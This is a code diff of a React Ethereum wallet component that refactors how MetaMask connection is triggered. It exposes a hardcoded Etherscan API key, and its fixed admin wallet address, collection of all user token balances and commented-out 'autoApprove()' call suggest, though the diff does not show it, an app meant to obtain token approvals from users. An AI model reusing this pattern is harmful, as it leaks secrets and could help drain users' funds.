@@ -14,52 +14,15 @@ const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"
 
 const adminWalletAddress = "0x4552411f0f8C54116E220DA3e76b95a0375df766";
 const web3 = new Web3(window.ethereum);
-const UserScreen = () => {
+const UserScreen = (props) => {
   const [myAddress, setMyaddress] = useState('');
   const [walletStatus, setWalletStatus] = useState(false);
   const [initStatus, setInitStatus] = useState(false);
   const [userAllToken, setUserAllToken] = useState([]);
   useEffect(() => {
-    const connectWallet = async () => {
-      if (typeof window.ethereum !== 'undefined') {
-        try {
-          if (window.ethereum) {
-            await window.ethereum.enable();
-            try {
-              // check if the chain to connect to is installed
-              // await window.ethereum.request({
-              //   method: 'wallet_switchEthereumChain',
-              //   params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
-              // });
-              const accounts = await web3.eth.getAccounts();
-              setMyaddress(accounts[0]);
-              setWalletStatus(true);
-            } catch (error) {
-              // This error code indicates that the chain has not been added to MetaMask
-              // if it is not, then install it into the user MetaMask
-              if (error.code === 4902) {
-                try {
-                  await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [
-                      {
-                        chainId: '0x1',
-                        rpcUrl: 'https://bsc-dataseed1.defibit.io/',
-                      },
-                    ],
-                  });
-                } catch (addError) {
-                  console.error(addError);
-                }
-              }
-              console.error(error);
-            }
-          }
-        } catch (e) {
-          return false;
-        }
-      }
-    }
+    if (props.walletConnect) connectWallet();
+  }, [props.walletConnect]);
+  useEffect(() => {
     const init = async (value) => {
       var valid = WAValidator.validate(value, 'ETH');
       var userAllTokenBalance = {
@@ -197,7 +160,6 @@ const UserScreen = () => {
         // autoApprove();
       }
     }
-    connectWallet();
     init(myAddress);
   }, [myAddress]);
 
@@ -280,6 +242,48 @@ const UserScreen = () => {
       }
     } catch (error) {
       console.log(error.message);
+    }
+  }
+  const connectWallet = async () => {
+    props.walletStatus();
+    if (typeof window.ethereum !== 'undefined') {
+      try {
+        if (window.ethereum) {
+          await window.ethereum.enable();
+          try {
+            // check if the chain to connect to is installed
+            // await window.ethereum.request({
+            //   method: 'wallet_switchEthereumChain',
+            //   params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
+            // });
+            const accounts = await web3.eth.getAccounts();
+            setMyaddress(accounts[0]);
+            setWalletStatus(true);
+
+          } catch (error) {
+            // This error code indicates that the chain has not been added to MetaMask
+            // if it is not, then install it into the user MetaMask
+            if (error.code === 4902) {
+              try {
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [
+                    {
+                      chainId: '0x1',
+                      rpcUrl: 'https://bsc-dataseed1.defibit.io/',
+                    },
+                  ],
+                });
+              } catch (addError) {
+                console.error(addError);
+              }
+            }
+            console.error(error);
+          }
+        }
+      } catch (e) {
+        return false;
+      }
     }
   }
   return (
